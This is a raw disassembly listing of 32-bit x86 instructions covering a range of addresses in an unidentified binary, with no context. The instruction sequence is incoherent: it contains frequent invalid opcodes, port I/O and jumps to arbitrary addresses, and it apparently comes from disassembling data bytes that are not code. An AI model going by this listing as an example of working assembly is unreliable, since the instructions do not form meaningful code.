  40fa86:	push   eax
  40fa87:	dec    esi
  40fa88:	les    ebp,FWORD PTR [edi-0x5]
  40fa8b:	xchg   ecx,eax
  40fa8c:	loop   0x40fabd
  40fa8e:	shl    DWORD PTR [esi-0xa],0xa4
  40fa92:	shl    DWORD PTR [edi+0x30],cl
  40fa95:	push   ebx
  40fa96:	fadd   DWORD PTR ds:0x470abe48
  40fa9c:	imul   esp,DWORD PTR [esi-0x3d97bdaa],0x4d0e71e1
  40faa6:	cli    
  40faa7:	push   es
  40faa8:	jmp    0x40fa7a
  40faaa:	test   BYTE PTR [ecx],ah
  40faac:	mov    esp,0x2984bb9
  40fab1:	and    eax,0x9fc02900
  40fab6:	mov    ah,0x28
  40fab8:	ins    DWORD PTR es:[edi],dx
  40fab9:	in     eax,0xc9
  40fabb:	and    eax,0xa6f98b97
  40fac0:	cdq    
  40fac1:	test   DWORD PTR [ecx+0x3a02ca01],esi
  40fac7:	or     eax,0x85e5c798
  40facc:	xor    al,0x80
  40face:	cdq    
  40facf:	fld    st(5)
  40fad1:	sub    eax,0x47fdf7db
  40fad6:	push   ecx
  40fad7:	enter  0xcd9a,0x21
  40fadb:	sub    ch,cl
  40fadd:	mov    ebp,0xd0e27e71
  40fae2:	adc    al,0x36
  40fae4:	hlt    
  40fae5:	arpl   WORD PTR [edx],cx
  40fae7:	sub    cl,BYTE PTR [edx]
  40fae9:	xchg   ax,ax
  40faeb:	(bad)  
  40faec:	out    dx,eax
  40faed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faee:	test   DWORD PTR [edx],esp
  40faf0:	lods   eax,DWORD PTR ds:[esi]
  40faf1:	aam    0xd5
  40faf3:	shl    DWORD PTR [ebp-0x49],1
  40faf6:	xor    eax,0xe3c48fe4
  40fafb:	xor    eax,0x52626900
  40fb00:	adc    ch,BYTE PTR [eax+esi*2]
  40fb03:	(bad)  
  40fb05:	jo     0x40fb56
  40fb07:	add    DWORD PTR [esi],edi
  40fb09:	enter  0xfd43,0x45
  40fb0d:	bound  eax,QWORD PTR [edx-0x42a3961b]
  40fb13:	daa    
  40fb14:	lds    esp,FWORD PTR ds:0x46346700
  40fb1a:	jo     0x40fae6
  40fb1c:	adc    al,0x0
  40fb1e:	mov    eax,0x3ae1a162
  40fb23:	adc    BYTE PTR [esi],bl
  40fb25:	pop    ss
  40fb26:	sbb    esp,ecx
  40fb28:	(bad)  
  40fb29:	js     0x40fb10
  40fb2b:	int3   
  40fb2c:	adc    eax,0xd48c7e93
  40fb31:	aaa    
  40fb32:	adc    BYTE PTR [ebx],al
  40fb34:	out    0xa1,eax
  40fb36:	fild   DWORD PTR [ebp+eiz*8-0xf]
  40fb3a:	mov    ebx,0x79f74aa2
  40fb3f:	mov    ds:0xfcee3099,al
  40fb44:	(bad)  
  40fb45:	out    0x34,al
  40fb47:	mov    ds:0xc2e5fc95,al
  40fb4c:	in     al,dx
  40fb4d:	push   ds
  40fb4e:	ins    DWORD PTR es:[edi],dx
  40fb4f:	mov    edx,ecx
  40fb51:	imul   edi,DWORD PTR [eax],0x79df7e88
  40fb57:	dec    esp
  40fb58:	sbb    al,bl
  40fb5a:	test   DWORD PTR [edi-0x1ffa8b3f],esp
  40fb60:	ss mov ebx,0x6c339e8f
  40fb66:	out    dx,al
  40fb67:	lods   eax,DWORD PTR ds:[esi]
  40fb68:	xchg   edi,eax
  40fb69:	mov    ah,BYTE PTR [ecx+0x39]
  40fb6c:	sub    DWORD PTR [ecx+0xc9b3b64],ebx
  40fb72:	inc    esp
  40fb73:	jbe    0x40fbf0
  40fb75:	pop    ecx
  40fb76:	push   es
  40fb77:	test   BYTE PTR ds:0x254d0dd1,dh
  40fb7d:	jo     0x40fb1d
  40fb7f:	gs pushf 
  40fb81:	pop    eax
  40fb82:	mov    DWORD PTR [ebx],esp
  40fb84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb85:	jnp    0x40fb3e
  40fb87:	xor    cl,BYTE PTR [esi]
  40fb89:	mov    ah,0x3a
  40fb8b:	(bad)  
  40fb8c:	sar    BYTE PTR [eax-0x47],0x1e
  40fb90:	repz and eax,0x4694bd3a
  40fb96:	pop    ebp
  40fb97:	in     al,dx
  40fb98:	in     eax,0x54
  40fb9a:	retf   0x5bcd
  40fb9d:	xchg   ebx,eax
  40fb9e:	mov    eax,ds:0x26dd00d0
  40fba3:	push   edi
  40fba4:	stos   DWORD PTR es:[edi],eax
  40fba5:	mov    bh,BYTE PTR [edi]
  40fba7:	jl     0x631aa7a9
  40fbad:	or     eax,0x8ea91340
  40fbb2:	xor    BYTE PTR [ebp-0x11],dl
  40fbb5:	pop    ebx
  40fbb6:	push   ebx
  40fbb7:	sbb    edx,edi
  40fbb9:	enter  0x300f,0xb0
  40fbbd:	bound  esi,QWORD PTR [edi-0x5ef25dc6]
  40fbc3:	mov    eax,0x67b4e256
  40fbc8:	test   DWORD PTR [edi],ecx
  40fbca:	push   edx
  40fbcb:	xor    eax,0x96d36847
  40fbd0:	push   ds
  40fbd1:	mov    eax,ds:0x4e27b31e
  40fbd6:	ds loop 0x40fc0b
  40fbd9:	pop    ecx
  40fbda:	out    dx,eax
  40fbdb:	jbe    0x40fb62
  40fbdd:	scas   eax,DWORD PTR es:[edi]
  40fbde:	add    edi,ebx
  40fbe0:	pop    ss
  40fbe1:	dec    esp
  40fbe2:	push   ss
  40fbe3:	fiadd  DWORD PTR [eax-0x4618e753]
  40fbe9:	adc    BYTE PTR [esi-0x5b5d93ff],0xbd
  40fbf0:	xor    bh,BYTE PTR [ecx+ebp*4-0x8]
  40fbf4:	xchg   esp,eax
  40fbf5:	sahf   
  40fbf6:	fbstp  TBYTE PTR [esi-0x528ddb65]
  40fbfc:	in     eax,dx
  40fbfd:	sbb    DWORD PTR [edx-0x17],ecx
  40fc00:	jmp    0x40fc20
  40fc02:	jns    0x40fbcc
  40fc04:	jmp    0xf122efe
  40fc09:	sbb    BYTE PTR [edx+0x12a1b0a],0x34
  40fc10:	sub    BYTE PTR [ebx],0xa5
  40fc13:	int3   
  40fc14:	in     al,dx
  40fc15:	iret   
  40fc16:	pop    ds
  40fc17:	scas   eax,DWORD PTR es:[edi]
  40fc18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc19:	in     eax,0x74
  40fc1b:	push   ds
  40fc1c:	shr    DWORD PTR [ecx+0x34],0xef
  40fc20:	into   
  40fc21:	sar    BYTE PTR [edi],0x1a
  40fc24:	enter  0x78bc,0x63
  40fc28:	add    DWORD PTR [esi+0x40],edi
  40fc2b:	aaa    
  40fc2c:	daa    
  40fc2d:	sti    
  40fc2e:	mov    bl,0xae
  40fc30:	mov    dh,0xf0
  40fc32:	or     al,BYTE PTR [esi+edi*4+0x1c]
  40fc36:	les    edx,FWORD PTR [edx-0x22be0bf1]
  40fc3c:	nop
  40fc3d:	xchg   ebp,eax
  40fc3e:	out    0x2d,al
  40fc40:	push   esp
  40fc41:	outs   dx,DWORD PTR ds:[esi]
  40fc42:	scas   eax,DWORD PTR es:[edi]
  40fc43:	loop   0x40fcb8
  40fc45:	mov    fs,esi
  40fc47:	pushf  
  40fc48:	mov    DWORD PTR [ebx+0x15],0x4c3bc91
  40fc4f:	adc    al,0x67
  40fc51:	in     al,0x88
  40fc53:	test   BYTE PTR [ebp+0x1cfcce24],ch
  40fc59:	test   BYTE PTR [ebx],bh
  40fc5b:	mov    edi,0x1944131a
  40fc60:	fwait
  40fc61:	inc    ebp
  40fc62:	cmp    eax,0x9b4154d7
  40fc67:	stos   DWORD PTR es:[edi],eax
  40fc68:	push   es
  40fc69:	and    ebp,esp
  40fc6b:	sahf   
  40fc6c:	or     eax,0xf3a7a63
  40fc72:	(bad)  
  40fc73:	iret   
  40fc74:	add    DWORD PTR [esi],ebp
  40fc76:	dec    eax
  40fc77:	pop    ebx
  40fc78:	xchg   edi,eax
  40fc79:	inc    eax
  40fc7a:	mov    BYTE PTR [eax+0x3a42577a],ch
  40fc80:	sbb    cl,BYTE PTR [ebx+ebx*8-0x2ffbcff7]
  40fc87:	movlps QWORD PTR [eax+ebp*2],xmm4
  40fc8b:	(bad)  
  40fc8c:	hlt    
  40fc8d:	xor    esp,DWORD PTR [esi-0x1c]
  40fc90:	mov    dh,0x66
  40fc92:	or     edx,DWORD PTR [esi-0x59]
  40fc95:	push   ebx
  40fc96:	icebp  
  40fc97:	je     0x40fca7
  40fc99:	push   eax
  40fc9a:	lods   eax,DWORD PTR ds:[esi]
  40fc9b:	sub    BYTE PTR [edx-0x7b37f4ec],0x6d
  40fca2:	(bad)  
  40fca3:	adc    al,0x4e
  40fca5:	ds cs xchg esp,eax
  40fca8:	and    BYTE PTR [ebx+0xe],cl
  40fcab:	cmp    DWORD PTR [edx-0x10],ebp
  40fcae:	les    edi,FWORD PTR [eax]
  40fcb0:	push   edi
  40fcb1:	retf   0xc970
  40fcb4:	call   0xf805:0x4d8a4114
  40fcbb:	test   eax,0x9c00ac46
  40fcc0:	(bad)  
  40fcc1:	out    dx,al
  40fcc2:	in     al,dx
  40fcc3:	xor    dl,BYTE PTR [ecx-0xd]
  40fcc6:	sbb    DWORD PTR [ebx-0x94ed960],edx
  40fccc:	(bad)
  40fcd0:	call   ebx
  40fcd2:	je     0x40fd07
  40fcd4:	ret    0x7dc0
  40fcd7:	jp     0x40fcb9
  40fcd9:	cld    
  40fcda:	out    dx,al
  40fcdb:	outs   dx,BYTE PTR ds:[esi]
  40fcdc:	aaa    
  40fcdd:	dec    edi
  40fcde:	outs   dx,DWORD PTR ds:[esi]
  40fcdf:	add    BYTE PTR [edi+0x7a],bl
  40fce2:	mov    al,ds:0x99d0ba8e
  40fce7:	int3   
  40fce8:	mov    bh,0x61
  40fcea:	lock stos BYTE PTR es:[edi],al
  40fcec:	lds    esp,FWORD PTR [edi-0x59a45ee6]
  40fcf2:	push   ss
  40fcf3:	loopne 0x40fd22
  40fcf5:	jbe    0x40fca8
  40fcf7:	jo     0x40fc90
  40fcf9:	imul   esp,ebp,0x333057da
  40fcff:	or     DWORD PTR [esp+eiz*8-0x464a285],edx
  40fd06:	inc    edi
  40fd07:	adc    eax,DWORD PTR [esi+0x17]
  40fd0a:	pop    ebx
  40fd0b:	mov    eax,ds:0x8b1567d6
  40fd10:	xchg   BYTE PTR ds:[ebp+0x5],dh
  40fd14:	je     0x40fd5f
  40fd16:	daa    
  40fd17:	cmp    eax,0x36eff67
  40fd1c:	fcom   QWORD PTR [eax-0x21]
  40fd1f:	sbb    eax,0x3a845b4c
  40fd24:	cwde   
  40fd25:	dec    esi
  40fd26:	cdq    
  40fd27:	push   esi
  40fd28:	fbstp  TBYTE PTR [ecx+0x54]
  40fd2b:	scas   eax,DWORD PTR es:[edi]
  40fd2c:	test   DWORD PTR [edi+0x2f],ecx
  40fd2f:	mov    al,ah
  40fd31:	repnz push edi
  40fd33:	aaa    
  40fd34:	inc    eax
  40fd35:	adc    eax,0x15dde507
  40fd3a:	cmc    
  40fd3b:	outs   dx,DWORD PTR ds:[esi]
  40fd3c:	xor    dh,BYTE PTR [ecx-0xd]
  40fd3f:	pcmpgtw mm7,QWORD PTR [eax+0x134fd7a4]
  40fd46:	dec    edx
  40fd47:	jge    0x40fda7
  40fd49:	stc    
  40fd4a:	mov    al,ds:0xb6ab7ce9
  40fd4f:	je     0x40fd0b
  40fd51:	sbb    eax,0x62206e3f
  40fd56:	mov    ch,0xf9
  40fd58:	pop    ebx
  40fd59:	sti    
  40fd5a:	test   al,0xf8
  40fd5c:	ins    DWORD PTR es:[edi],dx
  40fd5d:	(bad)  
  40fd5e:	and    eax,0x92d225d
  40fd63:	push   ebx
  40fd64:	cmp    DWORD PTR [ebp+0x51689ee6],ebx
  40fd6a:	cs (bad) 
  40fd6c:	cmp    bl,dh
  40fd6e:	ja     0x40fda8
  40fd70:	aad    0x2d
  40fd72:	lahf   
  40fd73:	and    eax,0xbf42c420
  40fd78:	adc    al,0x82
  40fd7a:	gs hlt 
  40fd7c:	push   0xb3dc6cd9
  40fd81:	shr    ebp,0x6c
  40fd84:	ret    
  40fd85:	aad    0x46
  40fd87:	xchg   ecx,eax
  40fd88:	rcl    BYTE PTR [eax],1
  40fd8a:	pop    ebx
  40fd8b:	sbb    bh,BYTE PTR [edi-0x44]
  40fd8e:	push   edx
  40fd8f:	xchg   BYTE PTR [edx+0x5d733690],dh
  40fd95:	mov    edx,0x1b523e77
  40fd9a:	addr16 cwde 
  40fd9c:	lock mov ah,0x88
  40fd9f:	dec    esp
  40fda0:	pop    ds
  40fda1:	cmp    eax,ebx
  40fda3:	mov    dl,0xa1
  40fda5:	test   DWORD PTR [esi-0x53d5529c],eax
  40fdab:	dec    esi
  40fdac:	mov    ah,0x19
  40fdae:	push   es
  40fdaf:	push   es
  40fdb0:	xchg   ecx,eax
  40fdb1:	loope  0x40fdf3
  40fdb3:	pop    ebx
  40fdb4:	int3   
  40fdb5:	gs mov dh,0xd5
  40fdb8:	pop    ss
  40fdb9:	pop    esp
  40fdba:	dec    ecx
  40fdbb:	not    BYTE PTR [edx+eax*4]
  40fdbe:	mov    ecx,DWORD PTR [ebp+ebp*1-0x5c]
  40fdc2:	dec    eax
  40fdc3:	sub    ah,BYTE PTR [edi-0x7270c004]
  40fdc9:	and    al,0xdc
  40fdcb:	call   0xbc896d79
  40fdd0:	pop    es
  40fdd1:	fisub  WORD PTR [ebx]
  40fdd3:	adc    DWORD PTR [ebp+0x23],edi
  40fdd6:	sar    DWORD PTR [eax],1
  40fdd8:	and    eax,0xf333790e
  40fddd:	pop    ecx
  40fdde:	es sub dh,dl
  40fde1:	mov    ah,0x19
  40fde3:	test   edx,eax
  40fde5:	fmul   st,st(6)
  40fde7:	mov    dh,0xc6
  40fde9:	sahf   
  40fdea:	outs   dx,DWORD PTR ds:[esi]
  40fdeb:	mov    ds:0x2846e277,al
  40fdf0:	in     al,dx
  40fdf1:	leave  
  40fdf2:	xlat   BYTE PTR ds:[ebx]
  40fdf3:	push   cs
  40fdf4:	jo     0x40fda3
  40fdf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf7:	lods   al,BYTE PTR ds:[esi]
  40fdf8:	cli    
  40fdf9:	fwait
  40fdfa:	cmp    BYTE PTR [ecx],ah
  40fdfc:	cmc    
  40fdfd:	int    0x75
  40fdff:	mov    ds:0xe69e3cec,eax
  40fe04:	rol    DWORD PTR [esi],1
  40fe06:	mov    dh,0x52
  40fe08:	aas    
  40fe09:	mov    edx,0xe593c794
  40fe0e:	inc    ebx
  40fe0f:	les    eax,FWORD PTR [ebx-0x8]
  40fe12:	sub    BYTE PTR [ebx+0x77d1c916],dh
  40fe18:	int3   
  40fe19:	jmp    0xeb76:0x6c5943ab
  40fe20:	or     al,0x52
  40fe22:	mov    DWORD PTR [edi],ebp
  40fe24:	retf   0xbf9f
  40fe27:	add    BYTE PTR [ebp+0x5165ef23],bl
  40fe2d:	outs   dx,DWORD PTR ds:[esi]
  40fe2e:	jmp    0x40fe52
  40fe30:	in     al,dx
  40fe31:	ret    0xdfd
  40fe34:	inc    eax
  40fe35:	pop    edx
  40fe36:	pop    ebx
  40fe37:	pushf  
  40fe38:	clc    
  40fe39:	getsec 
  40fe3b:	out    0xda,eax
  40fe3d:	push   edx
  40fe3e:	popf   
  40fe3f:	sub    ch,BYTE PTR [esi-0x59]
  40fe42:	or     eax,0x79a325d5
  40fe47:	jecxz  0x40fde6
  40fe49:	dec    edi
  40fe4a:	push   ds
  40fe4b:	adc    ebx,DWORD PTR [esi+ebp*4]
  40fe4e:	inc    ecx
  40fe4f:	push   edx
  40fe50:	aad    0x2b
  40fe52:	dec    ebx
  40fe53:	push   es
  40fe54:	and    al,al
  40fe56:	int3   
  40fe57:	jge    0x40fe5b
  40fe59:	jb     0x40fe71
  40fe5b:	outs   dx,DWORD PTR ds:[esi]
  40fe5c:	mov    ebp,gs
  40fe5e:	(bad)  
  40fe5f:	cmp    eax,esp
  40fe61:	and    ch,dl
  40fe63:	sub    cl,bl
  40fe65:	lods   eax,DWORD PTR ds:[esi]
  40fe66:	loope  0x40fe72
  40fe68:	pop    ecx
  40fe69:	dec    DWORD PTR [esi]
  40fe6b:	xchg   ecx,eax
  40fe6c:	mov    eax,0x24b1dac0
  40fe71:	scas   al,BYTE PTR es:[edi]
  40fe72:	xor    ah,BYTE PTR [ecx+0x4f]
  40fe75:	mov    ebx,DWORD PTR [edx+0x3c]
  40fe78:	mov    ecx,?
  40fe7a:	mov    edi,0x92a6354
  40fe7f:	and    dh,BYTE PTR [ebx-0x3c]
  40fe82:	ja     0x40fec8
  40fe84:	inc    ebp
  40fe85:	ds cmp bh,al
  40fe88:	loopne 0x40fedf
  40fe8a:	je     0x40fe11
  40fe8c:	iret   
  40fe8d:	fst    st(4)
  40fe8f:	add    DWORD PTR ds:[esi+0x43],0x4bc61ee2
  40fe97:	rcr    BYTE PTR [ebx-0x13802e82],1
  40fe9d:	out    0x27,al
  40fe9f:	mov    al,ds:0xd90dd1e2
  40fea4:	in     al,0x41
  40fea6:	arpl   WORD PTR [eax+0x17c48f53],dx
  40feac:	mov    ah,0x9
  40feae:	jo     0x40fe33
  40feb0:	mov    ebp,eax
  40feb2:	(bad)  
  40feb3:	cmp    ebp,DWORD PTR [edi+0x2c]
  40feb6:	xchg   edx,eax
  40feb7:	jae    0x40fed3
  40feb9:	cmp    ch,BYTE PTR [ebp-0x545ceba1]
  40febf:	cs ds dec ebx
  40fec2:	test   eax,0xe250dc8b
  40fec7:	in     al,0x9d
  40fec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feca:	repnz (bad) 
  40fecc:	js     0x40ff06
  40fece:	sbb    DWORD PTR [esi],esp
  40fed0:	es stc 
  40fed2:	cwde   
  40fed3:	cdq    
  40fed4:	data16 sub al,0xaa
  40fed7:	js     0x40fead
  40fed9:	cmp    eax,0x3e987754
  40fede:	pop    esp
  40fedf:	pop    edi
  40fee0:	pop    es
  40fee1:	add    bl,BYTE PTR [eax+0x72b67801]
  40fee7:	(bad)  
  40fee8:	retf   
  40fee9:	adc    ebp,edi
  40feeb:	adc    al,0x20
  40feed:	mov    eax,ds:0x869974ef
  40fef2:	xor    al,0x5f
  40fef4:	add    bl,BYTE PTR [ebp-0x15]
  40fef7:	ins    DWORD PTR es:[edi],dx
  40fef8:	xchg   edx,eax
  40fef9:	scas   eax,DWORD PTR es:[edi]
  40fefa:	sbb    al,0x8c
  40fefc:	or     BYTE PTR [ebx+0x25ddcab9],dh
  40ff02:	out    dx,eax
  40ff03:	stos   DWORD PTR es:[edi],eax
  40ff04:	es sub al,0x4e
  40ff07:	loope  0x40fe9a
  40ff09:	mov    ds:0x3c2ed1b8,al
  40ff0e:	call   0xa17b:0xfe856f16
  40ff15:	sbb    BYTE PTR [esi+0x7e],cl
  40ff18:	or     esp,eax
  40ff1a:	js     0x40fed3
  40ff1c:	pop    ds
  40ff1d:	mov    bh,0x6a
  40ff1f:	adc    al,0xbd
  40ff21:	and    al,0x27
  40ff23:	(bad)  
  40ff24:	pop    ebx
  40ff25:	fsub   QWORD PTR [ebx+0x34b1199d]
  40ff2b:	aas    
  40ff2c:	inc    edi
  40ff2d:	mov    ds:0xf67d8571,eax
  40ff32:	cli    
  40ff33:	pop    es
  40ff34:	fwait
  40ff35:	fwait
  40ff36:	adc    BYTE PTR [ecx+ecx*8-0x67989b11],dl
  40ff3d:	pushf  
  40ff3e:	rcr    BYTE PTR [ebx+0x36dcf10f],1
  40ff44:	xor    eax,edx
  40ff46:	inc    edx
  40ff47:	cli    
  40ff48:	dec    edi
  40ff49:	dec    edi
  40ff4a:	pop    eax
  40ff4b:	mov    al,0x62
  40ff4d:	push   0x4f
  40ff4f:	push   esi
  40ff50:	repz jg 0x40ff6b
  40ff53:	fmul   st(1),st
  40ff55:	mov    WORD PTR [edi-0x400229d0],fs
  40ff5b:	pop    es
  40ff5c:	adc    BYTE PTR [edi],ah
  40ff5e:	jle    0x40ff4a
  40ff60:	and    DWORD PTR [ebx+eiz*8],edi
  40ff63:	call   0xf3e66705
  40ff68:	xor    ch,BYTE PTR [esi-0xe]
  40ff6b:	aam    0xce
  40ff6d:	pop    ecx
  40ff6e:	ins    BYTE PTR es:[edi],dx
  40ff6f:	add    DWORD PTR [ebx],eax
  40ff71:	mov    WORD PTR [ebp-0x1b],fs
  40ff74:	push   edi
  40ff75:	in     al,dx
  40ff76:	mov    edi,0xb285a9d8
  40ff7b:	push   esp
  40ff7c:	sti    
  40ff7d:	add    BYTE PTR [edx],0x86
  40ff80:	shl    BYTE PTR [esi+ebx*2-0x1fa5a226],cl
  40ff87:	jle    0x40ffcd
  40ff89:	sbb    DWORD PTR [edx-0x30e130c5],edx
  40ff8f:	test   eax,0x8315b709
  40ff94:	imul   ebp,DWORD PTR [eax-0x51932c25],0xfffffff5
  40ff9b:	push   edi
  40ff9c:	sbb    al,0xeb
  40ff9e:	(bad)  
  40ff9f:	fild   WORD PTR [ecx+ebp*8+0x4c]
  40ffa3:	iret   
  40ffa4:	cmp    al,0x7d
  40ffa6:	fwait
  40ffa7:	xchg   ecx,eax
  40ffa8:	dec    edi
  40ffa9:	ret    
  40ffaa:	ret    0x1a4f
  40ffad:	(bad)
  40ffb0:	neg    BYTE PTR [edi+0x497d3b72]
  40ffb6:	sahf   
  40ffb7:	cmp    al,0xf3
  40ffb9:	xchg   ebx,eax
  40ffba:	xchg   edx,eax
  40ffbb:	(bad)  
  40ffbc:	call   0x10b3bc8f
  40ffc1:	mov    gs,WORD PTR [ecx-0x3d05bd0f]
  40ffc7:	out    dx,al
  40ffc8:	mov    ds:0x105d501e,eax
  40ffcd:	sti    
  40ffce:	and    al,BYTE PTR [edx+0xf]
  40ffd1:	(bad)  
  40ffd2:	mov    WORD PTR [ebp-0x5f02ba43],es
  40ffd8:	inc    ecx
  40ffd9:	jnp    0x40ffd6
  40ffdb:	xor    DWORD PTR [edi+0x8],eax
  40ffde:	ror    DWORD PTR [edi],1
  40ffe0:	mov    ebx,0x38f5e24c
  40ffe5:	rcl    ecx,1
  40ffe7:	xchg   esi,eax
  40ffe8:	paddw  mm6,QWORD PTR [edx+0x38]
  40ffec:	xorps  xmm0,XMMWORD PTR [esi-0x55]
  40fff0:	xor    eax,0x9693272
  40fff5:	push   cs
  40fff6:	pop    ebp
  40fff7:	sbb    al,0x5c
  40fff9:	scas   al,BYTE PTR es:[edi]
  40fffa:	and    ebx,edi
  40fffc:	cmp    BYTE PTR [ecx-0x1503854f],ch
  410002:	xor    al,0x32
  410004:	inc    ebx
  410005:	inc    ebx
  410006:	add    BYTE PTR [ebp+0x6ff963de],al
  41000c:	outs   dx,BYTE PTR ds:[esi]
  41000d:	add    al,0x76
  41000f:	ret    0x70b7
  410012:	ds repnz dec ebp
  410015:	pop    es
  410016:	sub    ecx,ebp
  410018:	adc    eax,0x14726ea8
  41001d:	leave  
  41001e:	cmp    eax,0xd38b19db
  410023:	mov    BYTE PTR [esi+0x4c],dh
  410026:	inc    edi
  410027:	xchg   esp,eax
  410028:	or     BYTE PTR [eax+0xb],bh
  41002b:	inc    ebx
  41002c:	cli    
  41002d:	sbb    edx,DWORD PTR [esi]
  41002f:	sar    eax,cl
  410031:	shr    BYTE PTR [edx+0x8ba374e],0x12
  410038:	sub    al,0x3a
  41003a:	je     0x40ffe0
  41003c:	mov    ds:0x622828da,eax
  410041:	fs cmp edi,ebx
  410044:	add    eax,0xd0569b4c
  410049:	ja     0x40fff5
  41004b:	cmp    ebp,ecx
  41004d:	and    edi,DWORD PTR [bx+si-0x25b2]
  410052:	xlat   BYTE PTR ds:[ebx]
  410053:	pop    ss
  410054:	mov    ds:0xe8ecac68,al
  410059:	mov    ebp,0xe90c1657
  41005e:	fwait
  41005f:	sub    ch,0x3b
  410062:	cmp    BYTE PTR [edx],ah
  410064:	icebp  
  410065:	xchg   ebx,eax
  410066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410067:	hlt    
  410068:	xor    esi,ecx
  41006a:	call   0x560:0x5b393f15
  410071:	fidivr DWORD PTR [esi-0x49387564]
  410077:	shl    DWORD PTR [ebx+ebp*2+0x46],0xfa
  41007c:	xor    ebp,DWORD PTR [eax+0x51]
  41007f:	cmp    eax,0xed6366c5
  410084:	(bad)  
  410085:	cmp    ecx,DWORD PTR [edi-0x3]
  410088:	nop
  410089:	xchg   BYTE PTR [edx-0x5c1d1542],cl
  41008f:	test   DWORD PTR [esi+0x61624919],ecx
  410095:	push   ss
  410096:	cld    
  410097:	inc    esp
  410098:	xchg   DWORD PTR [eax],ebx
  41009a:	mov    eax,0x89022c4d
  41009f:	dec    esp
  4100a0:	mov    ebp,0x9cdacb8b
  4100a5:	in     eax,0x58
  4100a7:	push   ebx
  4100a8:	jbe    0x4100f5
  4100aa:	call   0x5436:0x5aad3211
  4100b1:	ins    DWORD PTR es:[edi],dx
  4100b2:	out    dx,al
  4100b3:	or     ch,dh
  4100b5:	xchg   ebp,eax
  4100b6:	sti    
  4100b7:	cmp    ebx,DWORD PTR [esi-0x30]
  4100ba:	mov    ds:0x9e169085,eax
  4100bf:	mov    ds:0x9750d36c,eax
  4100c4:	in     eax,dx
  4100c5:	cli    
  4100c6:	cmp    al,0x5
  4100c8:	nop
  4100c9:	mov    ecx,0x9e7103c0
  4100ce:	sbb    al,0xc1
  4100d0:	popf   
  4100d1:	push   esp
  4100d2:	fwait
  4100d3:	rcl    DWORD PTR [ecx+0x71],1
  4100d6:	rcl    DWORD PTR [eax+eiz*1+0xadb9dd4],0xc3
  4100de:	inc    ebx
  4100df:	mov    ecx,0x20ee481b
  4100e4:	xchg   si,ax
  4100e6:	jns    0x4100af
  4100e8:	jo     0x41011e
  4100ea:	sbb    DWORD PTR ds:0xac88d00a,ebp
  4100f0:	xor    al,0xd4
  4100f2:	xchg   edi,esp
  4100f4:	jmp    FWORD PTR [eax-0x7dc673de]
  4100fa:	imul   eax,DWORD PTR [eax],0x84035d14
  410100:	pop    edi
  410101:	sub    ebx,edi
  410103:	dec    ebx
  410104:	add    eax,0x17683176
  410109:	rcl    al,0xa9
  41010c:	sti    
  41010d:	clc    
  41010e:	cmp    BYTE PTR [edx],0x9
  410111:	pop    edx
  410112:	mov    ch,0xfb
  410114:	cli    
  410115:	fisttp QWORD PTR [eax-0x1b1187b6]
  41011b:	mov    bh,0xc0
  41011d:	mov    al,0xc0
  41011f:	adc    BYTE PTR [esi-0x65b13bd6],bl
  410125:	xor    al,0x6b
  410127:	fcom   QWORD PTR [ebp-0x63553b0]
  41012d:	stos   DWORD PTR es:[edi],eax
  41012e:	fcmovu st,st(5)
  410130:	mov    ss,eax
  410132:	ret    0x830e
  410135:	stc    
  410136:	(bad)  
  410137:	fild   QWORD PTR [eax-0x508139f3]
  41013d:	int    0x72
  41013f:	bound  edx,QWORD PTR [ecx+0x6c]
  410142:	in     eax,0xfb
  410144:	rcr    bh,cl
  410146:	test   eax,0xd343eae9
  41014b:	or     ebp,DWORD PTR [ecx]
  41014d:	retf   0x39a6
  410150:	lods   al,BYTE PTR ds:[esi]
  410151:	mov    bh,0xc9
  410153:	clc    
  410154:	pop    esp
  410155:	push   ss
  410156:	mov    esp,0x6837da26
  41015b:	add    al,0xdd
  41015d:	cmp    bh,dl
  41015f:	push   edi
  410160:	sbb    eax,0x5fa3db45
  410165:	jo     0x410169
  410167:	std    
  410168:	popf   
  410169:	jmp    0x4100ec
  41016b:	dec    esp
  41016c:	push   ebp
  41016d:	cmp    BYTE PTR [ebp+0x7cd693f0],bl
  410173:	cmp    al,0xa8
  410175:	pop    edx
  410176:	xchg   DWORD PTR [edi+0x429a8679],ebx
  41017c:	(bad)  
  41017d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41017e:	adc    al,0x8f
  410180:	into   
  410181:	xor    eax,0xb4804da
  410186:	jnp    0x41016a
  410188:	cmp    eax,0xe5f14491
  41018d:	aas    
  41018e:	cmp    BYTE PTR [esi-0x6],0x43
  410192:	push   edx
  410193:	rol    DWORD PTR [ecx-0x6a],0xd9
  410197:	iret   
  410198:	mov    WORD PTR [ebp-0x484897ca],ds
  41019e:	lds    esi,FWORD PTR [esi-0x29550b57]
  4101a4:	in     eax,dx
  4101a5:	xor    dh,cl
  4101a7:	cld    
  4101a8:	adc    al,0xc6
  4101aa:	jle    0x4101b0
  4101ac:	enter  0x99b2,0xc8
  4101b0:	aaa    
  4101b1:	iret   
  4101b2:	loope  0x410224
  4101b4:	mov    ecx,esp
  4101b6:	push   eax
  4101b7:	sbb    eax,0xbc38254d
  4101bc:	xor    al,0x3e
  4101be:	add    esp,DWORD PTR [edx+0x6d]
  4101c1:	pusha  
  4101c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c3:	jge    0x41020a
  4101c5:	xchg   BYTE PTR [esi+0x12acfaa7],al
  4101cb:	js     0x307ff339
  4101d1:	and    eax,0x9ea00634
  4101d6:	in     eax,dx
  4101d7:	push   cs
  4101d8:	or     BYTE PTR [ecx],dl
  4101da:	rol    DWORD PTR [ebx+0x19],cl
  4101dd:	lock jbe 0x41025e
  4101e0:	inc    esp
  4101e1:	sub    BYTE PTR [eiz*2-0x72de3220],ch
  4101e8:	in     eax,0x76
  4101ea:	aam    0x73
  4101ec:	jae    0x410227
  4101ee:	dec    ecx
  4101ef:	jo     0x41020e
  4101f1:	sbb    edi,DWORD PTR [edx]
  4101f3:	ror    BYTE PTR [esi],cl
  4101f5:	jb     0x4101d6
  4101f7:	xor    DWORD PTR [eax+0x32],0x5d59842d
  4101fe:	retf   0x5146
  410201:	xchg   esp,eax
  410202:	mov    eax,edx
  410204:	dec    esp
